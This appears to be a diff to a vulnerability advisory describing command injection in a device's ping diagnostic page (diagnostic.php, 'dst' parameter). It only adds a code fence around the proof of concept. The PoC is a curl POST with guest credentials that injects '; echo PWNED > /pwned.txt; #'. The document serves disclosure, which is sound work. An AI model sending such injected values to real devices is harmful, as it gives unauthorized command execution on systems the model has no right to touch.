@@ -15,10 +15,12 @@ A1_FW101WWb04
 The vulnerable script handles ping diagnostics by passing user-supplied input from the `dst` POST parameter directly to the `set()` `xmldbc` function.
 
 ### PoC
+```bash
 curl -s http://ip:port/diagnostic.php \
       -u "guest:" \
       -d 'act=ping&dst=; echo PWNED > /pwned.txt; #'
-      
+```
+
 ![](vx_images/569648945757223.png)
 
 
